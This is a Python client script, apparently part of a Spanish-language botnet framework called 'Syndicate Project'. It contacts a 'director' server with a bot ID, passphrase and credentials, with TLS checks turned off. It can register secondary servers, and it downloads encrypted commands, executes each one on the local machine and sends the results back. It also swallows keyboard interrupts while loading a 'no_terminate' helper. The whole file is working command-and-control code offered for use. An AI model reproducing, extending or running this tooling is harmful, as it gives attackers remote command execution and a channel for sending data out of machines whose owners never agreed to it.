#!/usr/bin/env python3

while(1):

    try:

        from utils.sys_utils import no_terminate

    except KeyboardInterrupt:

        continue

    else:

        break

import requests
import socket
import sys
from os.path import isfile
from urllib3 import disable_warnings
from binascii import unhexlify

from modules.UI import argprogrammer

from utils.Checks import check_url
from utils.Executes import execute_command
from utils.Ciphers import simplycrypt

from conf import global_conf

disable_warnings()

verbose = lambda string: print(f'[RECOVER] - {string}')

def _detect_status_code(code):

    if (code == 200):

        _message = '¡Operación ejecutada con éxito!'

    elif (code == 404):

        _message = 'El recurso como un «comando» no existe'

    elif (code == 403):

        _message = 'No tienes permisos para acceder al director'

    elif (code == 400):

        _message = 'No estás siguiendo las especificaciones del director'

    elif (code == 500):

        _message = '¡Ocurrio un error en el servidor!'

    else:

        _message = 'Se desconoce el código de estado ...'

    verbose(f'[{code}]: {_message}')

    if not (code == 200):

        verbose('Saliendo ...')
        sys.exit(1)

class log(object):

    def __init__(self, address, username):

        (self.address, self.port) = address
        try:
            self.hostname = socket.getfqdn(socket.gethostbyname(self.address))
        except:
            self.hostname = 'null'
        self.username = username

    def logger(self, text, level):

        verbose('[%s/%s:%d](%s): %s' % (self.address, self.hostname, self.port, self.username, text))

default_chars = global_conf.hashing['chars']
default_iterations = global_conf.hashing['iterations']
default_security_number = global_conf.hashing['security_number']
default_decrement_number = global_conf.hashing['decrement_number']

group_access = 'Identificación'
group_login = 'Inicio de Sesión'
group_secundary_server = 'Servidor secundario'

parser = argprogrammer.Parser()

parser.set_head('''
       Syndicate Project - Recupera datos de un punto en la red
       -----------------   ------------------------------------''')

parser.add(['-h', '--help'], 'help', 'Mostrar ayuda y sale', group='Opcionales')

parser.add(['-u', '--url'], 'url', help='Dirección URL del bot', require=True)
parser.add(['-dD', '--database-password'], 'database_password', help='Contraseña de la base de datos', require=True)

parser.add(['-b', '--bot-id'], 'bot_id', help='Identificador del bot', require=True, group=group_access)
parser.add(['-p', '--passphrase'], 'passphrase', help='Frase de contraseña', require=True, group=group_access)
parser.add(['-c', '--chars'], 'chars', help='Los caracteres de seguridad', default=default_chars, group=group_access)
parser.add(['-i', '--iterations'], 'iterations', help='Las iteraciones de seguridad', default=default_iterations, type=int, group=group_access)
parser.add(['-sN', '--security-number'], 'security_number', help='Número de seguridad', default=default_security_number, type=int, group=group_access)
parser.add(['-dN', '--decrement-number'], 'decrement_number', help='Número de disminución', default=default_decrement_number, type=int, group=group_access)

parser.add(['-U', '--username'], 'username', help='Nombre de usuario', require=True, group=group_login)
parser.add(['-P', '--password'], 'password', help='Contraseña', require=True, group=group_login)

parser.add(['-add-secundary-server'] , 'add_secundary_server', help='Agregar un servidor secundario', group=group_secundary_server)
parser.add(['-pub-key'], 'pub_key', help='La clave pública del servidor secundario', group=group_secundary_server)

parser.add(['-H', '--hash'], 'hash', help='El identificador del director, para verificar que sea la entidad correspondiente', require=True)
parser.add(['-headers'], 'headers', help='Los encabezados a usar. Sintaxis: key=value&key2=value2', type=dict)

args = parser.parse_args()

url = args.url
chars = args.chars
iterations = str(args.iterations)
security_number = str(args.security_number)
decrement_number = str(args.decrement_number)
bot_id = args.bot_id
passphrase = args.passphrase
username = args.username
password = args.password
database_password = args.database_password
add_secundary_server = args.add_secundary_server
pub_key = args.pub_key
hash_ = args.hash
headers = args.headers

try:

    verbose('Verificando dirección ...')

    if (check_url.check(args.url, None, False) == True):

        verbose('La dirección URL no es válida ...')
        sys.exit(1)

    else:

        verbose('¡La dirección URL es válida!')

    _verify = requests.post(url, data=simplycrypt.encrypt(password, 'get_hash'), verify=False, timeout=global_conf.connector['timeout'], headers=headers)
    _detect_status_code(_verify.status_code)
    _hash_to_cmp = simplycrypt.decrypt(database_password, _verify.content)

    verbose('Identificador del director: "%s"' % (_hash_to_cmp))
    verbose('Comparando con: "%s"' % (hash_))

    if (_hash_to_cmp == hash_):

        verbose('[OK]: (%s == %s)' % (_hash_to_cmp, hash_))

    else:
        
        verbose('[ERROR]: NOT (%s == %s)' % (_hash_to_cmp, hash_))
        verbose('El identificador no es correcto ...')
        sys.exit(1)

    verbose('El identificador es correcto. Continuando ...')

    _data = {'chars':chars, 'iterations':iterations, 'security_number':security_number, 'decrement_number':decrement_number, 'passphrase':passphrase, 'id':bot_id, 'data':None, 'command':[username, password, None]}

    if not (add_secundary_server == None) and not (pub_key == None):

        if not (isfile(pub_key) == True):

            verbose('La clave pública no existe ...')
            sys.exit(1)

        else:

            with open(pub_key, 'rt') as _obj:

                pub_key = _obj.read().rstrip()

        _data['command'][2] = 'add_secundary_server'
        _data['data'] = [add_secundary_server, pub_key]

        _response = requests.post(url, data=simplycrypt.encrypt(password, _data), verify=False, timeout=global_conf.connector['timeout'], headers=headers)

        _detect_status_code(_response.status_code)

        verbose('Correcto, se agrego el servidor secundario: "%s"' % (add_secundary_server))

    else:

        _data['command'][2] = 'recover'

        verbose('Descargando contenido de %s ...' % (url))

        _response = requests.post(url, data=simplycrypt.encrypt(password, _data), verify=False, timeout=global_conf.connector['timeout'], headers=headers)

        verbose('Descargado; Desencriptando ...')

        if (_response.status_code == 200) and not (_response.content == ''):

            _decrypted = simplycrypt.decrypt(database_password, _response.content)

            verbose('Desencriptado; Ejecutando comando ...')

            if (len(_decrypted) > 0):

                for indicator, _ in enumerate(_decrypted, 1):

                    verbose('Comando: (%d/%d)' % (indicator, len(_decrypted)))

                    _result = execute_command.execute(_['data'], bot_id, log(_['address'], _['id']))
                    
                    verbose('Ejecutado con éxito ...')
                    verbose('Enviando el resultado ...')
                    _data['data'] = {_['data'][0]:_result}
                    _data['command'][2] = 'result'
                    
                    _response = requests.post(url, data=simplycrypt.encrypt(password, _data), verify=False, timeout=global_conf.connector['timeout'], headers=headers)

                    _detect_status_code(_response.status_code)

                    verbose('¡Enviado! ...')

            else:

                verbose('Ya se obtuvieron los datos en una petición anterior ...')

        else:

            verbose('Al parecer no hay datos para desencriptar!')

except KeyboardInterrupt:

    sys.exit(0)

except Exception as Except:
    
    verbose('Ocurrio una excepción desconocida: "{}"'.format(Except))
